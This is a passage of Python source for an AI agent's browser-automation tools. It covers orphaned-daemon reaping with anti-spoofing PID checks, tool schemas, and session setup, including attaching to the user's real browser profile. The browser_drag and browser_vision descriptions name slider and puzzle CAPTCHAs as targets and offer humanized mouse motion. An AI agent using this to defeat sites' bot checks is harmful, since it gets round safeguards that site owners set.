    at an arbitrary victim process, or a recycled PID can land on an unrelated
    process after the real daemon exits.  Either way, terminating that PID
    (a *tree* kill via ``_terminate_host_pid``) is an arbitrary-process DoS.

    Before reaping we require, via ``psutil`` (a hard dependency, cross-platform
    for same-user processes — the only processes the reaper can signal):

      1. **Identity** — the process looks like agent-browser: ``agent-browser``
         appears in its name or command line.
      2. **Binding** — the process is bound to *this* session's socket dir: the
         socket dir path (or its basename) appears in the command line, or in
         ``AGENT_BROWSER_SOCKET_DIR`` in the process environment.

    Requirement (2) is the real spoof defense: a planted process pointing at a
    victim PID will not have the victim's cmdline/environ referencing our
    socket dir.  An attacker would need a process that genuinely embeds this
    exact session path — i.e. a real daemon they already own and could signal
    directly.  Fail-closed: any ambiguity (unreadable cmdline, no match) means
    we refuse to reap and leave the process and its socket dir alone.

    Returns ``True`` only when both checks pass.
    """
    try:
        import psutil
    except ImportError:  # psutil is a hard dep; defensive only
        logger.warning(
            "Refusing to reap browser daemon PID %d (session %s): "
            "psutil unavailable for identity verification",
            daemon_pid, session_name)
        return False

    try:
        proc = psutil.Process(daemon_pid)
        name = (proc.name() or "").lower()
        cmdline = " ".join(proc.cmdline() or []).lower()
    except psutil.NoSuchProcess:
        # Vanished between the liveness check and now — nothing to reap.
        return False
    except (psutil.AccessDenied, OSError) as exc:
        logger.warning(
            "Refusing to reap browser daemon PID %d (session %s): "
            "could not read process identity (%s)",
            daemon_pid, session_name, exc)
        return False

    looks_like_browser = "agent-browser" in name or "agent-browser" in cmdline
    if not looks_like_browser:
        logger.warning(
            "Refusing to reap PID %d (session %s): not an agent-browser "
            "process (name=%r)", daemon_pid, session_name, name)
        return False

    # Binding check: the live process must reference *this* socket dir.
    socket_dir_l = socket_dir.lower()
    socket_base_l = os.path.basename(socket_dir).lower()
    bound = socket_dir_l in cmdline or (
        socket_base_l and socket_base_l in cmdline)
    if not bound:
        try:
            env_dir = (proc.environ() or {}).get(
                "AGENT_BROWSER_SOCKET_DIR", "")
            bound = bool(env_dir) and os.path.normpath(env_dir) == \
                os.path.normpath(socket_dir)
        except (psutil.AccessDenied, psutil.NoSuchProcess, OSError):
            # environ() can be denied even same-user on some platforms.
            # cmdline already failed to bind — fail closed.
            bound = False

    if not bound:
        logger.warning(
            "Refusing to reap agent-browser PID %d: not bound to session "
            "socket dir %s (possible recycled PID or planted pid file)",
            daemon_pid, socket_dir)
        return False

    return True


def _socket_dir_idle_seconds(socket_dir: str) -> Optional[float]:
    """Seconds since anything in ``socket_dir`` was last written.

    Every browser command writes ``_stdout_<cmd>`` / ``_stderr_<cmd>`` temp
    files into the session's socket dir, so the newest mtime under that dir is
    a last-activity marker that — unlike ``_session_last_activity`` — survives
    hermes restarts and does not depend on in-memory bookkeeping surviving an
    exception path.

    The directory's own mtime is not sufficient: command names repeat, so
    rewriting an existing ``_stdout_click`` updates that file's mtime but not
    the directory's.  Scan the entries too.

    Returns ``None`` when the age cannot be determined, so callers can fail
    safe (treat unknown age as "too young to reap").
    """
    try:
        latest = os.path.getmtime(socket_dir)
    except OSError:
        return None

    try:
        with os.scandir(socket_dir) as entries:
            for entry in entries:
                try:
                    latest = max(latest, entry.stat().st_mtime)
                except OSError:
                    continue
    except OSError:
        pass  # dir mtime alone is still a usable lower bound

    return max(0.0, time.time() - latest)


def _reap_orphaned_browser_sessions():
    """Scan for orphaned agent-browser daemon processes from previous runs.

    When the Python process that created a browser session exits uncleanly
    (SIGKILL, crash, gateway restart), the in-memory ``_active_sessions``
    tracking is lost but the node + Chromium processes keep running.

    This function scans the tmp directory for ``agent-browser-*`` socket dirs
    left behind by previous runs, reads the daemon PID files, and kills any
    daemons whose owning hermes process is no longer alive.

    Ownership detection priority:
      1. ``<session>.owner_pid`` file (written by current code) — if the
         referenced hermes PID is alive, leave the daemon alone regardless
         of whether it's in *this* process's ``_active_sessions``.  This is
         cross-process safe: two concurrent hermes instances won't reap each
         other's daemons.
      2. Fallback for daemons that predate owner_pid: check
         ``_active_sessions`` in the current process.  If not tracked here,
         treat as orphan (legacy behavior).

    Safe to call from any context — atexit, cleanup thread, or on demand.
    """
    import glob

    # Lightpanda servers spawned for Browser Use mode keep their own records
    # (no agent-browser socket dir); sweep them with the same owner-liveness
    # rule before the daemon scan, which may return early.
    try:
        from tools.browser_lightpanda import reap_orphaned_lightpanda

        reap_orphaned_lightpanda()
    except Exception as e:
        logger.debug("Lightpanda orphan reap failed: %s", e)

    tmpdir = _socket_safe_tmpdir()
    pattern = os.path.join(tmpdir, "agent-browser-h_*")
    socket_dirs = glob.glob(pattern)
    # Also pick up CDP sessions
    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-cdp_*"))
    # Also pick up cloud-provider sessions (browser-use/browserbase/firecrawl)
    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-hermes_*"))

    if not socket_dirs:
        return

    # Build set of session_names currently tracked by this process (fallback path)
    with _cleanup_lock:
        tracked_names = {
            info.get("session_name")
            for info in _active_sessions.values()
            if info.get("session_name")
        }

    reaped = 0
    for socket_dir in socket_dirs:
        dir_name = os.path.basename(socket_dir)
        # dir_name is "agent-browser-{session_name}"
        session_name = dir_name.removeprefix("agent-browser-")
        if not session_name:
            continue

        # Ownership check: prefer owner_pid file (cross-process safe).
        owner_pid_file = os.path.join(socket_dir, f"{session_name}.owner_pid")
        owner_pid: Optional[int] = None
        owner_alive: Optional[bool] = None  # None = owner_pid missing/unreadable
        if os.path.isfile(owner_pid_file):
            try:
                owner_pid = int(Path(owner_pid_file).read_text(encoding="utf-8").strip())
                # ``os.kill(pid, 0)`` is NOT a no-op on Windows (bpo-14484).
                # Use the cross-platform existence check.
                from gateway.status import _pid_exists
                owner_alive = _pid_exists(owner_pid)
            except (ValueError, OSError):
                owner_pid = None
                owner_alive = None  # corrupt file — fall through

        if owner_alive is True:
            # Owner is alive.  Normally that means the session belongs to a
            # live hermes process and must not be touched — but "owner alive"
            # alone made leaked daemons immortal: if the owner lost its
            # in-memory tracking (any exception path between spawn and
            # registration), nothing would ever reap the daemon, and the
            # daemon-side AGENT_BROWSER_IDLE_TIMEOUT_MS does not fire when the
            # daemon itself is wedged (e.g. Chrome's framework was swapped out
            # from under it by an auto-update).
            #
            # So: still trust live tracking, but fall back to idle age.
            if session_name in tracked_names:
                continue

            idle_s = _socket_dir_idle_seconds(socket_dir)
            if idle_s is None or idle_s < BROWSER_ORPHAN_GRACE_SECONDS:
                # Unknown age, or still within the grace window — fail safe.
                continue

            logger.warning(
                "Browser session %s has a live owner (PID %s) but is untracked "
                "and idle for %ds (grace %ds) — treating as leaked and reaping",
                session_name, owner_pid, int(idle_s),
                BROWSER_ORPHAN_GRACE_SECONDS)
            # fall through to the reap path below

        if owner_alive is None:
            # No owner_pid file (legacy daemon).  Fall back to in-process
            # tracking: if this process knows about the session, leave alone.
            if session_name in tracked_names:
                continue

        # owner_alive is False (dead owner) OR legacy daemon not tracked here.
        pid_file = os.path.join(socket_dir, f"{session_name}.pid")
        if not os.path.isfile(pid_file):
            # A newly-created session directory exists briefly before
            # agent-browser writes its PID/owner files. Another Hermes process
            # may run this global reaper during that window. Treat a pidless
            # directory as stale only after the orphan grace period; deleting
            # it immediately races the creator's first stdout/stderr open.
            idle_s = _socket_dir_idle_seconds(socket_dir)
            if idle_s is None or idle_s < BROWSER_ORPHAN_GRACE_SECONDS:
                continue
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        try:
            daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
        except (ValueError, OSError):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # Check if the daemon is still alive. ``os.kill(pid, 0)`` on Windows
        # is NOT a no-op — use the handle-based existence check.
        from gateway.status import _pid_exists
        if not _pid_exists(daemon_pid):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # The PID is live — but the .pid file lives in a world-writable,
        # predictably-named temp dir we don't write ourselves, and PIDs get
        # recycled after the real daemon exits.  Verify the process really is
        # *this* session's agent-browser daemon before tree-killing it; refuse
        # otherwise (don't touch the process, leave the socket dir for a later
        # sweep once the imposter PID is gone).  Fixes the arbitrary same-user
        # process DoS in issue #14073.
        if not _verify_reapable_browser_daemon(
                daemon_pid, socket_dir, session_name):
            continue

        # Daemon is alive and its owner is dead (or legacy + untracked).  Reap.
        # Use the process-tree termination helper so Chromium children
        # (renderer, GPU, etc.) are cleaned up, not just the daemon parent.
        try:
            from gateway.status import get_process_start_time
            from tools.process_registry import ProcessRegistry
            daemon_start = get_process_start_time(daemon_pid)
            if daemon_start is None:
                # Identity can't be fingerprinted — the verify above matched,
                # but without a start time _terminate_host_pid cannot rule out
                # a recycle between verify and kill. Refuse; a later sweep
                # retries once the process table settles.
                logger.warning(
                    "Refusing to reap browser daemon PID %d (session %s): "
                    "no start-time fingerprint available", daemon_pid, session_name)
                continue
            ProcessRegistry._terminate_host_pid(daemon_pid, daemon_start)
            logger.info("Reaped orphaned browser daemon PID %d (session %s)",
                        daemon_pid, session_name)
            reaped += 1
        except (ProcessLookupError, PermissionError, OSError):
            pass

        # Clean up the socket directory
        shutil.rmtree(socket_dir, ignore_errors=True)

    if reaped:
        logger.info("Reaped %d orphaned browser session(s) from previous run(s)", reaped)


def _browser_cleanup_thread_worker():
    """
    Background thread that periodically cleans up inactive browser sessions.

    Runs every 30 seconds and checks for sessions that haven't been used
    within the BROWSER_SESSION_INACTIVITY_TIMEOUT period.

    Also reaps orphaned daemons — on startup (sessions left by previous
    process lifetimes) *and* every BROWSER_ORPHAN_REAP_INTERVAL seconds
    thereafter.  The periodic pass matters because a leak is not only a
    across-restart phenomenon: a daemon can fall out of in-memory tracking
    at any point in a long-lived process, and a startup-only reap can never
    recover from that.
    """
    reap_every_cycles = max(1, round(BROWSER_ORPHAN_REAP_INTERVAL / 30))
    cycle = 0

    while _cleanup_running:
        # cycle 0 is the startup reap; then every reap_every_cycles.
        if cycle % reap_every_cycles == 0:
            try:
                _reap_orphaned_browser_sessions()
            except Exception as e:
                logger.warning("Orphan reap error: %s", e)
        cycle += 1

        try:
            _cleanup_inactive_browser_sessions()
        except Exception as e:
            logger.warning("Cleanup thread error: %s", e)

        # Sleep in 1-second intervals so we can stop quickly if needed
        for _ in range(30):
            if not _cleanup_running:
                break
            time.sleep(1)


def _start_browser_cleanup_thread():
    """Start the background cleanup thread if not already running."""
    global _cleanup_thread, _cleanup_running

    with _cleanup_lock:
        if _cleanup_thread is None or not _cleanup_thread.is_alive():
            _cleanup_running = True
            _cleanup_thread = threading.Thread(
                target=_browser_cleanup_thread_worker,
                daemon=True,
                name="browser-cleanup"
            )
            _cleanup_thread.start()
            logger.info("Started inactivity cleanup thread (timeout: %ss)", BROWSER_SESSION_INACTIVITY_TIMEOUT)


def _stop_browser_cleanup_thread():
    """Stop the background cleanup thread."""
    global _cleanup_running
    _cleanup_running = False
    if _cleanup_thread is not None:
        _cleanup_thread.join(timeout=5)


def _update_session_activity(task_id: str):
    """Update the last activity timestamp for a session.

    Also records the owning Hermes home on first sight so the process-global
    janitor can tear the session down under its owner's scope (#86402).  An
    activity touch deliberately does NOT reset ``_cleanup_failures`` — only a
    successful cleanup does.
    """
    with _cleanup_lock:
        _session_last_activity[task_id] = time.time()
        _session_owner_homes.setdefault(task_id, str(get_hermes_home()))


# Register cleanup thread stop on exit
atexit.register(_stop_browser_cleanup_thread)


# ============================================================================
# Tool Schemas
# ============================================================================

BROWSER_TOOL_SCHEMAS = [
    {
        "name": "browser_navigate",
        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). For plain-text endpoints — URLs ending in .md, .txt, .json, .yaml, .yml, .csv, .xml, raw.githubusercontent.com, or any documented API endpoint — prefer curl via the terminal tool or web_extract; the browser stack is overkill and much slower for these. Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "The URL to navigate to (e.g., 'https://example.com')"
                }
            },
            "required": ["url"]
        }
    },
    {
        "name": "browser_snapshot",
        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 15000 chars are truncated or LLM-summarized; when that happens the complete snapshot is saved to a file and the output includes its path so you can page through the rest with read_file. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
        "parameters": {
            "type": "object",
            "properties": {
                "full": {
                    "type": "boolean",
                    "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
                    "default": False
                }
            },
            "required": []
        }
    },
    {
        "name": "browser_click",
        "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
                }
            },
            "required": ["ref"]
        }
    },
    {
        "name": "browser_type",
        "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e3')"
                },
                "text": {
                    "type": "string",
                    "description": "The text to type into the field"
                }
            },
            "required": ["ref", "text"]
        }
    },
    {
        "name": "browser_scroll",
        "description": "Scroll the page in a direction. Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "direction": {
                    "type": "string",
                    "enum": ["up", "down"],
                    "description": "Direction to scroll"
                }
            },
            "required": ["direction"]
        }
    },
    {
        "name": "browser_mouse_wheel",
        "description": (
            "Mouse-wheel scroll a nested scrollable container (virtualised feed, "
            "chat list, dropdown, map) that browser_scroll doesn't move. Target an "
            "element ref, x/y, or the viewport centre; positive delta_y scrolls down. "
            "Requires browser_navigate first."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "delta_y": {"type": "number", "description": "Vertical wheel delta in pixels (positive = down, negative = up). Default 0."},
                "delta_x": {"type": "number", "description": "Horizontal wheel delta in pixels. Default 0."},
                "ref": {"type": "string", "description": "Element ref (e.g. 'e22') to hover before wheeling; the wheel fires at its centre. Preferred over x/y."},
                "x": {"type": "number", "description": "Explicit x viewport coordinate (ignored if ref is set)."},
                "y": {"type": "number", "description": "Explicit y viewport coordinate (ignored if ref is set)."}
            },
            "required": []
        }
    },
    {
        "name": "browser_drag",
        "description": (
            "Real mouse drag (press -> move -> release) for drag-and-drop, sliders, "
            "slider/puzzle CAPTCHAs, and canvas widgets. Start and end points each given "
            "as a snapshot ref, CSS selector, or viewport x/y coords. Optional waypoints "
            "for curved paths; humanize for eased motion. Requires browser_navigate first."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "from_ref": {"type": "string", "description": "Start element ref from the snapshot (e.g. '@e5')."},
                "to_ref": {"type": "string", "description": "End/drop element ref from the snapshot (e.g. '@e9')."},
                "from_selector": {"type": "string", "description": "Start element CSS selector (dragged from its center)."},
                "to_selector": {"type": "string", "description": "End/drop element CSS selector (dragged to its center)."},
                "from_x": {"type": "number", "description": "Start X in viewport pixels (use with from_y)."},
                "from_y": {"type": "number", "description": "Start Y in viewport pixels (use with from_x)."},
                "to_x": {"type": "number", "description": "End X in viewport pixels (use with to_y)."},
                "to_y": {"type": "number", "description": "End Y in viewport pixels (use with to_x)."},
                "waypoints": {
                    "type": "array",
                    "description": "Optional explicit path between press and release, as a list of {x,y} points.",
                    "items": {
                        "type": "object",
                        "properties": {"x": {"type": "number"}, "y": {"type": "number"}},
                    },
                },
                "steps": {"type": "integer", "description": "Interpolation steps per move segment (default 20)."},
                "hold_ms": {"type": "integer", "description": "Pause after pressing the mouse, ms (default 120)."},
                "release_delay_ms": {"type": "integer", "description": "Pause before releasing, ms (default 120)."},
                "humanize": {"type": "boolean", "description": "Eased motion with slight jitter (default false)."},
                "button": {"type": "string", "enum": ["left", "middle", "right"], "description": "Mouse button (default left)."}
            },
            "required": []
        }
    },
    {
        "name": "browser_back",
        "description": "Navigate back to the previous page in browser history. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_press",
        "description": "Press a keyboard key. Useful for submitting forms (Enter), navigating (Tab), or keyboard shortcuts. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "key": {
                    "type": "string",
                    "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')"
                }
            },
            "required": ["key"]
        }
    },
    {
        "name": "browser_get_images",
        "description": "Get a list of all images on the current page with their URLs and alt text. Useful for finding images to analyze with the vision tool. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_vision",
        "description": "Take a screenshot of the current page so you can inspect it visually. Use this when you need to understand what the page looks like - especially for CAPTCHAs, visual verification challenges, complex layouts, or cases where the text snapshot misses important visual information. When your active model has native vision, the screenshot is attached to your context directly and you inspect it on the next turn; otherwise Hermes falls back to an auxiliary vision model and returns a text analysis. Includes a screenshot_path that you can share with the user by including MEDIA:<screenshot_path> in your response. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "question": {
                    "type": "string",
                    "description": "What you want to know about the page visually. Be specific about what you're looking for."
                },
                "annotate": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout."
                }
            },
            "required": ["question"]
        }
    },
    {
        "name": "browser_console",
        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
        "parameters": {
            "type": "object",
            "properties": {
                "clear": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, clear the message buffers after reading"
                },
                "expression": {
                    "type": "string",
                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
                }
            },
            "required": []
        }
    },
    {
        "name": "browser_tab",
        "description": "Manage browser tabs. Supports creating a new tab, listing open tabs, switching to a tab by 1-based index, or closing a tab. When no index is provided for close, closes the active tab. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["new", "list", "switch", "close"],
                    "description": "Tab action to perform"
                },
                "index": {
                    "type": "integer",
                    "minimum": 1,
                    "description": "1-based tab index for switch or close"
                },
                "url": {
                    "type": "string",
                    "description": "Optional URL to open when creating a new tab"
                }
            },
            "required": ["action"]
        }
    },
    {
        "name": "browser_upload",
        "description": "Upload one or more local files through a file input element identified by its ref ID. Accepts either a single path or multiple paths. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The file input element reference from the snapshot (e.g., '@e3')"
                },
                "path": {
                    "type": "string",
                    "description": "Single local file path to upload"
                },
                "paths": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Multiple local file paths to upload"
                }
            },
            "required": ["ref"]
        }
    },
    {
        "name": "browser_dropzone_upload",
        "description": "Attach one or more local files to a drag-and-drop uploader (Dropzone.js and similar 'drop files here' zones) where browser_upload fails because the file input is hidden/JS-managed. Provide the dropzone element's CSS selector. Requires browser_navigate first.",
        "parameters": {
            "type": "object",
            "properties": {
                "selector": {
                    "type": "string",
                    "description": "CSS selector of the dropzone element (default '.dropzone')"
                },
                "path": {
                    "type": "string",
                    "description": "Single local file path to upload"
                },
                "paths": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Multiple local file paths to upload"
                }
            },
            "required": []
        }
    },
    {
        "name": "browser_download",
        "description": "Download a file by clicking an element identified by its ref ID. If no path is provided, Hermes saves it to a persistent default downloads directory and returns the absolute path. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
                },
                "path": {
                    "type": "string",
                    "description": "Optional destination file path. If omitted, Hermes chooses a persistent default path."
                }
            },
            "required": ["ref"]
        }
    },
    {
        "name": "browser_eval",
        "description": "Execute a JavaScript expression in the current page and return its result. Use this to READ structured data from the DOM in one cheap call (e.g. pull a listing's fields out of window.__NEXT_DATA__ or JSON-LD, count/collect elements, scroll an inner container). Do NOT use it to INTERACT: for clicking, typing, scrolling the page, or navigating, always prefer browser_click / browser_type / browser_scroll / browser_navigate — they are more reliable than synthetic JS events and keep the accessibility tree in sync. Rule of thumb: reading the page → eval is great; changing the page → use the dedicated tool.",
        "parameters": {
            "type": "object",
            "properties": {
                "expression": {
                    "type": "string",
                    "description": "JavaScript expression to evaluate (e.g., \"document.querySelectorAll('.price').length\"). Async/await is supported."
                }
            },
            "required": ["expression"]
        }
    },
    {
        "name": "browser_pdf",
        "description": "Save the current page as a PDF file (useful for archiving listings, receipts, articles). If no path is provided, Hermes saves it to the persistent default downloads directory and returns the absolute path. Requires browser_navigate first.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Optional destination .pdf file path. If omitted, Hermes chooses a persistent default path."
                }
            },
            "required": []
        }
    },
    {
        "name": "browser_mouse",
        "description": "Low-level mouse control: move the cursor, press/release a button, or hover an element. Combine move/down/up for custom gestures; use hover to trigger menus and tooltips. Target with a snapshot ref, a CSS selector, or absolute viewport x/y coordinates.",
        "parameters": {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["move", "down", "up", "hover"],
                    "description": "Mouse action: 'move' cursor, 'down' press button, 'up' release button, 'hover' an element"
                },
                "ref": {
                    "type": "string",
                    "description": "Element reference from the snapshot (e.g., '@e5') for move/hover targets"
                },
                "selector": {
                    "type": "string",
                    "description": "CSS selector for move/hover targets (alternative to ref)"
                },
                "x": {
                    "type": "number",
                    "description": "Viewport x coordinate (alternative to ref/selector, for 'move')"
                },
                "y": {
                    "type": "number",
                    "description": "Viewport y coordinate (alternative to ref/selector, for 'move')"
                },
                "button": {
                    "type": "string",
                    "enum": ["left", "middle", "right"],
                    "description": "Mouse button for down/up (default 'left')"
                }
            },
            "required": ["action"]
        }
    },
    {
        "name": "browser_start",
        "description": "Open the browser window without navigating anywhere. You almost never need this: every browser tool starts the browser automatically when it is not already running. Use it only to deliberately put a window on screen for the user.",
        "parameters": {"type": "object", "properties": {}, "required": []}
    },
    {
        "name": "browser_close",
        "description": "Close the browser window. Call this once you are done with the browser: the window stays open across tasks and even across Hermes restarts, so nothing else closes it for you. Do NOT call it while you still have pages to read, and do NOT call it right after an unresolved error \u2014 leaving the window open is what lets you or the user inspect what went wrong.",
        "parameters": {"type": "object", "properties": {}, "required": []}
    },
]


# ============================================================================
# Utility Functions
# ============================================================================

def _create_local_session(task_id: str, allow_real_profile: bool = True) -> Dict[str, str]:
    import uuid
    local_settings = _get_local_browser_settings()
    if local_settings["profile_dir"]:
        # Persistent-profile mode (hermes-mods): every task shares one fixed
        # session backed by the same Chromium profile, so logins persist
        # across restarts.  Chromium locks the user-data dir, so a single
        # shared browser is a requirement here, not just a simplification.
        session_name = local_settings["session_name"]
        try:
            os.makedirs(local_settings["profile_dir"], mode=0o700, exist_ok=True)
        except OSError as e:
            logger.warning("Could not create browser profile dir %s: %s",
                           local_settings["profile_dir"], e)
        logger.info("Using persistent local browser session %s (profile=%s) for task %s",
                    session_name, local_settings["profile_dir"], task_id)
        return {
            "session_name": session_name,
            "bb_session_id": None,
            "cdp_url": None,
            "features": {"local": True, "persistent_profile": True},
        }

    # Real-profile consent: instead of an agent-browser-managed throwaway
    # Chromium, attach this local session (via CDP) to the user's default
    # browser running on a hermes-owned SNAPSHOT of their real profile —
    # live logins/cookies included. Fail closed on resolver/launch errors:
    # a consented user must never be silently downgraded to a throwaway.
    #
    # ``allow_real_profile=False`` is passed by the hybrid private-URL sidecar
    # (``::local`` key): that path exists to keep a LAN/loopback host OFF the
    # cloud backend, and routing the user's full authenticated cookie jar to an
    # arbitrary internal host the model chose to visit is a strictly larger
    # exposure than the routing rule was protecting against — and one the user
    # never consented to for that URL. The sidecar always gets a throwaway
    # profile. (Also keeps a real-profile resolve failure from breaking
    # private-URL routing, which has nothing to do with the real profile.)
    if allow_real_profile:
        cdp_url, err = _real_profile_cdp()
        if err:
            raise RuntimeError(err)
        if cdp_url:
            session_name = f"rp_{uuid.uuid4().hex[:10]}"
            logger.info(
                "Created real-profile local session %s for task %s", session_name, task_id
            )
            return {
                "session_name": session_name,
                "bb_session_id": None,
                "cdp_url": _resolve_cdp_override(cdp_url),
                "features": {"local": True, "real_profile": True},
            }

    # Browser Use mode drives whatever CDP endpoint it is handed; with
    # ``browser.engine: lightpanda`` that endpoint is a Hermes-spawned
    # ``lightpanda serve``. The built-in tools never reach this branch —
    # they are hidden in Browser Use mode — and keep driving Lightpanda via
    # ``agent-browser --engine lightpanda`` on the plain local session below.
    if _is_browser_use_cli_mode() and _using_lightpanda_engine():
        return _create_lightpanda_session(task_id)

    session_name = f"h_{uuid.uuid4().hex[:10]}"
    logger.info("Created local browser session %s for task %s",
                session_name, task_id)
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": None,
        "features": {"local": True},
    }


def _create_lightpanda_session(task_id: str) -> Dict[str, Any]:
    """Spawn ``lightpanda serve`` for this session key (Browser Use mode)."""
    import uuid
    from tools.browser_lightpanda import launch_lightpanda

    session_name = f"lp_{uuid.uuid4().hex[:10]}"
    server, err = launch_lightpanda(
        session_name, block_private_networks=not _is_local_backend()
    )
    if err:
        raise RuntimeError(err)
    logger.info(
        "Created Lightpanda session %s (port %s) for task %s",
        session_name, server.port, task_id,
    )
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": server.cdp_url,
        "features": {"local": True, "lightpanda": True},
    }


def _local_backend_process_dead(session_info: Dict[str, Any]) -> bool:
    """True for a Lightpanda session whose ``lightpanda serve`` is gone."""
    if not (session_info.get("features") or {}).get("lightpanda"):
        return False
    from tools.browser_lightpanda import get_server

    server = get_server(session_info.get("session_name", ""))
    return server is None or not server.is_alive()


def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
    """Create a session that connects to a user-supplied CDP endpoint."""
    import uuid
    if _is_managed_cdp_url(cdp_url):
        # One shared daemon for the managed browser, mirroring the fixed
        # session name the persistent-profile local backend already uses.
        session_name = _MANAGED_CDP_SESSION_NAME
    else:
        session_name = f"cdp_{uuid.uuid4().hex[:10]}"
    logger.info("Created CDP browser session %s → %s for task %s",
                session_name, _sanitize_url_for_logs(cdp_url), task_id)
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": cdp_url,
        "features": {"cdp_override": True},
    }


def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
    """
    Get or create session info for the given session key.

    In cloud mode, creates a Browserbase session with proxies enabled.
    In local mode, generates a session name for agent-browser --session.
    Also starts the inactivity cleanup thread and updates activity tracking.
    Thread-safe: multiple subagents can call this concurrently.

    Args:
        task_id: Session key.  Normally the task_id as-is, but may carry the
            ``::local`` suffix for the hybrid-routing local sidecar — in that
            case the cloud provider is skipped even when one is configured,
            and a local Chromium session is created instead.

    Returns:
        Dict with session_name (always), bb_session_id + cdp_url (cloud only)
    """
    if task_id is None:
        task_id = "default"

    # Start the cleanup thread if not running (handles inactivity timeouts)
    _start_browser_cleanup_thread()

    # Update activity timestamp for this session
    _update_session_activity(task_id)

    with _cleanup_lock:
        # Check if we already have a session for this task
        existing_session = _active_sessions.get(task_id)

    # Suspect-session recycle (#72205 / #85125 3b): a previous command
    # timeout marked this cached session suspect via the SuspectableBackend
    # adapter.  ensure_healthy() tears it down here, at next use, and we fall
    # through to create a fresh session — the expensive recycle lives on this
    # path, not on the timeout path (mark must stay cheap).
    if existing_session is not None and not _browser_session_backend(task_id).ensure_healthy():
        # Teardown removes the activity entry; the replacement must be
        # tracked by the inactivity reaper like an initial session.
        _update_session_activity(task_id)
        with _cleanup_lock:
            replacement = _active_sessions.get(task_id)
        if replacement is not None and replacement is not existing_session:
            # Another thread already recycled and re-created it.
            return replacement
        existing_session = None

    if existing_session is not None:
        if (
            not _session_has_expired(existing_session)
            and not _local_backend_process_dead(existing_session)
        ):
            return existing_session

        logger.info(
            "Replacing expired or dead browser session for task %s",
            task_id,
        )
        _cleanup_single_browser_session(task_id)
        # Cleanup removes the activity entry. The replacement session must be
        # tracked by the inactivity reaper just like an initial session.
        _update_session_activity(task_id)

        # Guard against a concurrent replacement: another thread may have
        # already cleaned up the expired session and created a fresh one
        # while we were waiting.  If so, return the live replacement instead
        # of falling through to create yet another session.
        with _cleanup_lock:
            replacement = _active_sessions.get(task_id)
        if replacement is not None and replacement is not existing_session:
            return replacement

    # Hybrid routing: session keys ending with ``::local`` force a local
    # Chromium regardless of the globally-configured cloud provider.  Public
    # URLs in the same conversation continue to use the cloud session under
    # the bare task_id key.
    force_local = _is_local_sidecar_key(task_id)

    # Managed local browser: make sure one exists, and that BROWSER_CDP_URL
    # points at it, before the override below is resolved.  This is the single
    # chokepoint every browser_* tool passes through, so the guarantee holds
